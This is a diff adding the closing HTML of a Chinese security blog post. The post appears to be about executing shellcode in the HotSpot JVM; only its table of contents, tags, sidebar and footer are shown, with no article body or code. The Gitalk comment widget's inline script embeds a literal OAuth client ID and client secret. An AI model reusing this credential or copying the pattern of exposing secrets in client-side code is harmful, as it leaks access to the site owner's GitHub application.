+            <li><strong>版权声明：</strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="external nofollow" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明出处！
+            </li>
+            </ul>
+        
+        
+        <div class="level is-size-7 is-uppercase">
+            <div class="level-start">
+                <div class="level-item">
+                    <span class="is-size-6 has-text-grey has-mr-7">#</span>
+                    <a class="has-link-grey -link" href="/tags/HotSpot/">HotSpot</a>, <a class="has-link-grey -link" href="/tags/JVM/">JVM</a>, <a class="has-link-grey -link" href="/tags/shellcode/">shellcode</a>
+                </div>
+            </div>
+        </div>
+        
+        
+        
+    </div>
+</div>
+
+
+
+
+
+<div class="card card-transparent">
+    <div class="level post-navigation is-flex-wrap is-mobile">
+        
+        
+        <div class="level-end">
+            <a class="level level-item has-link-grey  article-nav-next" href="/2022/02/16/Java_RMI攻击分析与总结/">
+                <span class="level-item">Java RMI攻击分析与总结</span>
+                <i class="level-item fas fa-chevron-right"></i>
+            </a>
+        </div>
+        
+    </div>
+</div>
+
+
+
+<div class="card">
+    <div class="card-content">
+        <h3 class="title is-5 has-text-weight-normal">评论</h3>
+        
+<div id="comment-container"></div>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.css">
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js"></script>
+<script>
+    var gitalk = new Gitalk({
+        clientID: '372fb49f2243341bf93b',
+        clientSecret: 'b79da9cd60cecc3af662428f1daa6e01b1702d75',
+        id: 'b39c57fd05727b5ef7a2c3b9a0e4dfae',
+        repo: 'p1ay2win.github.io',
+        owner: 'p1ay2win',
+        admin: "p1ay2win",
+        createIssueManually: false,
+        distractionFreeMode: false
+    })
+    gitalk.render('comment-container')
+</script>
+
+
+    </div>
+</div>
+
+</div>
+                
+
+
+
+
+<div class="column is-4-tablet is-4-desktop is-3-widescreen  has-order-1 column-left ">
+    
+        
+<div class="card widget">
+    <div class="card-content">
+        <nav class="level">
+            <div class="level-item has-text-centered" style="flex-shrink: 1">
+                <div>
+                    
+                    <figure class="image is-128x128 has-mb-6">
+                        <img class="is-rounded" src="/images/header.png" alt="p1ay2win">
+                    </figure>
+                    
+                    <p class="is-size-4 is-block">
+                        p1ay2win
+                    </p>
+                    
+                    
+                    <p class="is-size-6 is-block">
+                        他们的爱与风华，只问自由，只问盛放，只问深情，只问初心，只问勇敢，无问西东。
+                    </p>
+                    
+                    
+                    <p class="is-size-6 is-flex is-flex-center has-text-grey">
+                        <i class="fas fa-map-marker-alt has-mr-7"></i>
+                        <span>CN</span>
+                    </p>
+                    
+                </div>
+            </div>
+        </nav>
+        <nav class="level is-mobile">
+            <div class="level-item has-text-centered is-marginless">
+                <div>
+                    <p class="heading">
+                        文章
+                    </p>
+                    <p class="title has-text-weight-normal">
+                        35
+                    </p>
+                </div>
+            </div>
+            <div class="level-item has-text-centered is-marginless">
+                <div>
+                    <p class="heading">
+                        分类
+                    </p>
+                    <p class="title has-text-weight-normal">
+                        7
+                    </p>
+                </div>
+            </div>
+            <div class="level-item has-text-centered is-marginless">
+                <div>
+                    <p class="heading">
+                        标签
+                    </p>
+                    <p class="title has-text-weight-normal">
+                        31
+                    </p>
+                </div>
+            </div>
+        </nav>
+        
+        <div class="level">
+            <a class="level-item button is-link is-rounded" href="https://p1ay2win.github.io" target="_blank">
+                关注我</a>
+        </div>
+        
+        
+        
+        <div class="level is-mobile">
+            
+            <a class="level-item button is-white is-marginless" target="_blank"
+                title="Github" href="https://github.com/P1ay2win/">
+                
+                <i class="fab fa-github"></i>
+                
+            </a>
+            
+            <a class="level-item button is-white is-marginless" target="_blank"
+                title="Twitter" href="https://twitter.com/p1ay2win">
+                
+                <i class="fab fa-twitter"></i>
+                
+            </a>
+            
+            <a class="level-item button is-white is-marginless" target="_blank"
+                title="RSS" href="/atom.xml">
+                
+                <i class="fas fa-rss"></i>
+                
+            </a>
+            
+        </div>
+        
+    </div>
+</div>
+
+    
+        
+
+    <div class="card widget column-left is-sticky" id="toc">
+        <div class="card-content">
+            <div class="menu">
+                <h3 class="menu-label">
+                    目录
+                </h3>
+                <ul class="menu-list"><li>
+        <a class="is-flex" href="#前言">
+        <span class="has-mr-6">1</span>
+        <span>前言</span>
+        </a></li><li>
+        <a class="is-flex" href="#基于JNI">
+        <span class="has-mr-6">2</span>
+        <span>基于JNI</span>
+        </a></li><li>
+        <a class="is-flex" href="#基于JDK自带的Native方法">
+        <span class="has-mr-6">3</span>
+        <span>基于JDK自带的Native方法</span>
+        </a></li><li>
+        <a class="is-flex" href="#基于oop偏移">
+        <span class="has-mr-6">4</span>
+        <span>基于oop偏移</span>
+        </a><ul class="menu-list"><li>
+        <a class="is-flex" href="#Unsafe类">
+        <span class="has-mr-6">4.1</span>
+        <span>Unsafe类</span>
+        </a></li><li>
+        <a class="is-flex" href="#Oop-Klass模型">
+        <span class="has-mr-6">4.2</span>
+        <span>Oop-Klass模型</span>
+        </a></li><li>
+        <a class="is-flex" href="#即时编译（JIT）">
+        <span class="has-mr-6">4.3</span>
+        <span>即时编译（JIT）</span>
+        </a></li><li>
+        <a class="is-flex" href="#原理分析">
+        <span class="has-mr-6">4.4</span>
+        <span>原理分析</span>
+        </a></li><li>
+        <a class="is-flex" href="#部分问题修复及改进">
+        <span class="has-mr-6">4.5</span>
+        <span>部分问题修复及改进</span>
+        </a></li></ul></li><li>
+        <a class="is-flex" href="#后记">
+        <span class="has-mr-6">5</span>
+        <span>后记</span>
+        </a></li><li>
+        <a class="is-flex" href="#参考">
+        <span class="has-mr-6">6</span>
+        <span>参考</span>
+        </a></li></ul>
+            </div>
+        </div>
+    </div>
+
+
+    
+    
+        <div class="column-right-shadow is-hidden-widescreen ">
+        
+        </div>
+    
+</div>
+
+
+                
+
+            </div>
+        </div>
+    </section>
+    <footer class="footer">
+    <div class="container">
+        <div class="level">
+            <div class="level-start has-text-centered-mobile">
+                <a class="footer-logo is-block has-mb-6" href="/">
+                
+                    P1ay2win&#39;s blog
+                
+                </a>
+                <p class="is-size-7">
+                &copy; 2022 P1ay2win&nbsp;
+                <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>访问量<span id="busuanzi_value_site_pv"></span>次  <i class="fa fa-user-md"></i>  访客数<span id="busuanzi_value_site_uv"></span>人<br>
+                Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> & <a
+                        href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank">Icarus</a>
+                
+                </p>
+            </div>
+            <div class="level-end">
+            
+                <div class="field has-addons is-flex-center-mobile has-mt-5-mobile is-flex-wrap is-flex-middle">
+                
+                <p class="control">
+                    <a class="button is-white is-large" target="_blank" title="Creative Commons" href="https://creativecommons.org/">
+                        
+                        <i class="fab fa-creative-commons"></i>
+                        
+                    </a>
+                </p>
+                
+                <p class="control">
+                    <a class="button is-white is-large" target="_blank" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/">
+                        
+                        <i class="fab fa-creative-commons-by"></i>
+                        
+                    </a>
+                </p>
+                
+                <p class="control">
+                    <a class="button is-white is-large" target="_blank" title="Download on GitHub" href="https://p1ay2win.github.io">
+                        
+                        <i class="fab fa-github"></i>
+                        
+                    </a>
+                </p>
+                
+                </div>
+            
+            </div>
+        </div>
+    </div>
+</footer>
+
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script>
+<script>moment.locale("zh-CN");</script>
+
+<script>
+var IcarusThemeSettings = {
+    article: {
+        highlight: {
+            clipboard: true,
+            fold: 'unfolded'
+        }
+    }
+};
+</script>
+
+
+    <script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script>
+
+
+
+    
+    
+<script src="/js/animation.js"></script>
+
+    
+    
+<script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/js/lightgallery.min.js" defer></script>
+<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js" defer></script>
+<script src="/js/gallery.js" defer></script>
+
+    
+    
+<div id="outdated">
+    <h6>Your browser is out-of-date!</h6>
+    <p>Update your browser to view this website correctly. <a id="btnUpdateBrowser" href="http://outdatedbrowser.com/">Update
+            my browser now </a></p>
+    <p class="last"><a href="#" id="btnCloseUpdateBrowser" title="Close">&times;</a></p>
+</div>
+<script src="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.js" defer></script>
+<script>
+    document.addEventListener("DOMContentLoaded", function () {
+        outdatedBrowser({
+            bgColor: '#f25648',
+            color: '#ffffff',
+            lowerThan: 'flex'
+        });
+    });
+</script>
+
+    
+    <script src="https://cdn.jsdelivr.net/npm/mathjax@2.7.5/unpacked/MathJax.js?config=TeX-MML-AM_CHTML" defer></script>
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+    MathJax.Hub.Config({
+        'HTML-CSS': {
+            matchFontHeight: false
+        },
+        SVG: {
+            matchFontHeight: false
+        },
+        CommonHTML: {
+            matchFontHeight: false
+        },
+        tex2jax: {
+            inlineMath: [
+                ['$','$'],
+                ['\\(','\\)']
+            ]
+        }
+    });
+});
+</script>
+    
+    
+<a id="back-to-top" title="回到顶端" href="javascript:;">
+    <i class="fas fa-chevron-up"></i>
+</a>
+<script src="/js/back-to-top.js" defer></script>
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+
+<script src="/js/main.js" defer></script>
+
+    
+    <div class="searchbox ins-search">
+    <div class="searchbox-container ins-search-container">
+        <div class="searchbox-input-wrapper">
+            <input type="text" class="searchbox-input ins-search-input" placeholder="想要查找什么..." />
+            <span class="searchbox-close ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="searchbox-result-wrapper ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+    (function (window) {
+        var INSIGHT_CONFIG = {
+            TRANSLATION: {
+                POSTS: '文章',
+                PAGES: '页面',
+                CATEGORIES: '分类',
+                TAGS: '标签',
+                UNTITLED: '(无标题)',
+            },
+            CONTENT_URL: '/content.json',
+        };
+        window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+    })(window);
+</script>
+<script src="/js/insight.js" defer></script>
+<link rel="stylesheet" href="/css/search.css">
+<link rel="stylesheet" href="/css/insight.css">
+    
+</body>
+</html>
